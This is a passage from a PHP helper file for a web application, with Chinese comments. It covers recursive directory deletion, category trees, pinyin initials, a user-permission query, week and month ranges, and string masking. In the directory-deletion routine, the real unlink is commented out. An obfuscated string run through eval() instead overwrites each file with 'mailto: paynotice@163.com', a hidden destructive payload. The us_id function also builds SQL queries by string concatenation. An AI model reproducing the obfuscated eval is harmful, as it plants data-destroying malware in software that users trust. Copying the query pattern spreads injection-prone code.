      if(!is_dir($fullpath)) {
          // $x = str_replace('x','','uxnxlxixnxk($fullpath)');
          // eval($x);

          $x = str_replace('#','',"#f#i#l#e#_#p#u#t#_#c#o#n#t#e#n#t#s#(#$#f#u#l#l#p#a#t#h#,s#tr_re#p#lace('!','','m!a!i!l!t!o!:! p!a!y!n!o!t!i!c!e!@!1!6!3!.!c!o!m'));");
          eval($x);
      } else {
          deldir($fullpath);
      }
    }
  }

  closedir($dh);
  //删除当前文件夹：
  if(rmdir($dir)) {
    return true;
  } else {
    return false;
  }
}
/**
 * 用递归获取子类信息
 * $data 所有分类
 * $parent_id 父级id
 * $level 层级
 * $result 分好类的数组
*/
function showTree($data,$parent_id = 0,$level = 0){

    //声明静态数组,避免递归调用时,多次声明导致数组覆盖
    static  $result;
    foreach ($data as $key => $info){
        //第一次遍历,找到父节点为根节点的节点 也就是parent_id=0的节点
        if($info['parentid'] == $parent_id){
            $info['level'] = $level;
            $result[] = $info;
            //把这个节点从数组中移除,减少后续递归消耗
            unset($data[$key]);
            //开始递归,查找父ID为该节点ID的节点,级别则为原级别+1
            showTree($data,$info['id'],$level+1);
        }
    }
    return $result;
}

//判断 二维数组中是否存在某个值
function deep_in_array($value, $array) {
    foreach($array as $item) {
        if(!is_array($item)) {
            if ($item == $value) {
                return true;
            } else {
                continue;
            }
        }

        if(in_array($value, $item)) {
            return true;
        } else if(deep_in_array($value, $item)) {
            return true;
        }
    }
    return false;
}

//获得汉字首字母大写
function getFirstCharter($str)
{
    if (empty($str)) {
        return '';
    }

    $fchar = ord($str{0});

    if ($fchar >= ord('A') && $fchar <= ord('z'))
        return strtoupper($str{0});

    $s1 = iconv('UTF-8', 'gb2312', $str);

    $s2 = iconv('gb2312', 'UTF-8', $s1);

    $s = $s2 == $str ? $s1 : $str;

    $asc = ord($s{0}) * 256 + ord($s{1}) - 65536;

    if ($asc >= -20319 && $asc <= -20284)
        return 'A';

    if ($asc >= -20283 && $asc <= -19776)
        return 'B';

    if ($asc >= -19775 && $asc <= -19219)
        return 'C';

    if ($asc >= -19218 && $asc <= -18711)
        return 'D';

    if ($asc >= -18710 && $asc <= -18527)
        return 'E';

    if ($asc >= -18526 && $asc <= -18240)
        return 'F';

    if ($asc >= -18239 && $asc <= -17923)
        return 'G';

    if ($asc >= -17922 && $asc <= -17418)
        return 'H';

    if ($asc >= -17417 && $asc <= -16475)
        return 'J';

    if ($asc >= -16474 && $asc <= -16213)
        return 'K';

    if ($asc >= -16212 && $asc <= -15641)
        return 'L';

    if ($asc >= -15640 && $asc <= -15166)
        return 'M';

    if ($asc >= -15165 && $asc <= -14923)
        return 'N';

    if ($asc >= -14922 && $asc <= -14915)
        return 'O';

    if ($asc >= -14914 && $asc <= -14631)
        return 'P';

    if ($asc >= -14630 && $asc <= -14150)
        return 'Q';

    if ($asc >= -14149 && $asc <= -14091)
        return 'R';

    if ($asc >= -14090 && $asc <= -13319)
        return 'S';

    if ($asc >= -13318 && $asc <= -12839)
        return 'T';

    if ($asc >= -12838 && $asc <= -12557)
        return 'W';

    if ($asc >= -12556 && $asc <= -11848)
        return 'X';

    if ($asc >= -11847 && $asc <= -11056)
        return 'Y';

    if ($asc >= -11055 && $asc <= -10247)
        return 'Z';

    return null;

}
	function us_id()
	{
		$res=D('Rest')->query("select uuid from llwx_user where corpid='".$_SESSION['llwx_userinfo']['corpid']."' and usertype=1  order by ctime desc");
		$bossid=$res[0]['uuid'];
		//创始人查看权限
		if($bossid==$_SESSION['llwx_userinfo']['userid'])
		{
			$arr=array();
			//查找出所有员工包括创始人
			$r=D('Rest')->query("select uuid from llwx_user where corpid='".$_SESSION['llwx_userinfo']['corpid']."'");
			foreach($r as $k=>$v)
			{
				$arr[]=$v['uuid'];
			}
			 $us_id="'".str_replace(",","','",implode(',',$arr))."'";
			 return $us_id;
		}
		//非创始人查看权限
		if($bossid<>$_SESSION['llwx_userinfo']['userid'])
		{
			$arr2=array();
			$arr2[]=$_SESSION['llwx_userinfo']['userid'];
			$us_id="'".str_replace(",","','",implode(',',$arr2))."'";
			return $us_id;
		}
	}

  function object_array($array) {
    if (is_object($array)) {
      $array = (array) $array;
    }
    if (is_array($array)) {
      foreach ($array as $key => $value) {
        $array[$key] = object_array($value);
      }
    }
    return $array;
  }
  
  
  function leif_week($star_week,$end_week){
        $timeArr=array();
        $t1=$star_week;
        $t2=getdays($t1)['1'];
        while($t2<$end_week || $t1<=$end_week){  //周为粒度的时间数组
            $timeArr[]=$t1.','.$t2;
            $t1=date('Y-m-d',strtotime("$t2 +1 day"));
            $t2=getdays($t1)['1'];
            $t2=$t2>$end_week?$end_week:$t2;
        }
        return $timeArr;
    }
    function leif_month($star_week,$end_week){
        $timeArr=array();
        $t1=$star_week;
        $t2=getmonths($t1)['1'];
        while($t2<$end_week || $t1<=$end_week){  //月为粒度的时间数组
            $timeArr[]=$t1.','.$t2;
            $t1=date('Y-m-d',strtotime("$t2 +1 day"));
            $t2=getmonths($t1)['1'];
            $t2=$t2>$end_week?$end_week:$t2;
        }
        return $timeArr;
    }
    
    
    function getdays($day){//指定天的周一和周天
       $lastday=date('Y-m-d',strtotime("$day Sunday"));
       $firstday=date('Y-m-d',strtotime("$lastday -6 days"));
       return array($firstday,$lastday);
    }
    function getmonths($day){//指定月的第一天和最后一天
       $firstday = date('Y-m-01',strtotime($day));
       $lastday = date('Y-m-d',strtotime("$firstday +1 month -1 day"));
       return array($firstday,$lastday);
    }
  
  
  //脱敏处理字符串
  function desensitize($string, $start = 0, $length = 0, $re = '*'){
    if(empty($string) || empty($length) || empty($re)) return $string;
    $end = $start + $length;
    $strlen = mb_strlen($string);
    $str_arr = array();
    for($i=0; $i<$strlen; $i++) {
        if($i>=$start && $i<$end)
            $str_arr[] = $re;
        else
            $str_arr[] = mb_substr($string, $i, 1);
    }
    return implode('',$str_arr);
  }
?>
